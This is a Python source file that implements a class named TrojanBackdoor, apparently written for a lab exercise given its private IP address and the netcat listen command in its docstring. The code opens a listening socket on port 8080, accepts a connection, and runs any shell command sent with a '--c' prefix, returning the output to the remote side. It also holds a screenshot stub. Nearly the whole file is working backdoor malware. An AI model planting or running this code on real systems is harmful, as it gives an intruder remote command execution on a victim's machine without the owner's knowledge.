"""
nc -vv -l -p 8080  #Listen to the 8080 port locally
"""
import socket, os, time, threading, sys
from subprocess import Popen, PIPE

class TrojanBackdoor(threading.Thread):
    def __init__(self, conf_dict):
        threading.Thread.__init__(self)
        self.conf_dict = conf_dict
        self.host = conf_dict['host']
        self.port = conf_dict['port']
        self.int_buff = 1024
        self.master_message = None
        self.conn = None

    def decode_utf8(self, data):
        return data.decode('utf-8')

    def encode_utf8(self, data):
        return data.encode('utf-8')

    def create_socket(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except Exception as e:
            print("Socket creation error: ", e)

    def socket_bind(self):
        try:
            self.sock.bind((self.host, self.port))
            print("Listening on port: ", self.sock.getsockname())
            self.sock.listen()
        except Exception as e:
            print("Socket bind error: ", e)

    def socket_accept(self):
        try:
            self.conn, address = self.sock.accept()
            self.conn.setblocking(1)  # no timeout set to False
            print("Accepting connection from ", address)
        except Exception as e:
            print("Accepted connection error: ", e)

    def receive_message(self):
        try:
            self.master_message = self.decode_utf8(self.conn.recv(self.int_buff))
            print("Master message: ", self.master_message)
        except Exception as e:
            print("Receive message error: ", e)

    def send_message(self, message="Returning data"):
        try:
            self.conn.send(message.encode())
            print("Sending message: ", message)
        except Exception as e:
            print("Send message error: ", e)

    def backdoor_logic(self):
        while True:
            # print("waiting for incoming message")
            self.receive_message()
            if self.master_message != "":
                command = self.master_message
                if command[:3] == "--c":
                    self.execute_shell_command()
                elif command[:3] == "--s":
                    self.execute_screenshot()
                elif command[:4] == "exit":
                    self.close()
                    break
                else:
                    self.send_message("Unknown command, please try again")

    def execute_shell_command(self):
        command = self.master_message[3:]
        p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
        std_out, std_err =  p.communicate()
        if std_out != b"":
            self.send_message(std_out.decode())
        else:
            self.send_message(std_err.decode())

    def execute_screenshot(self):
        pass
        self.send_message("screenshot command Executed")

    def run(self):
        self.create_socket()
        self.socket_bind()
        self.socket_accept()
        self.backdoor_logic()

    def close(self):
        self.sock.close()


def main():
    conf_dict = {'host': '10.0.2.4', 'port': 8080}
    trojan_instance = TrojanBackdoor(conf_dict)
    trojan_instance.run()


if __name__ == '__main__':
    error_code = main()
    sys.exit(error_code)
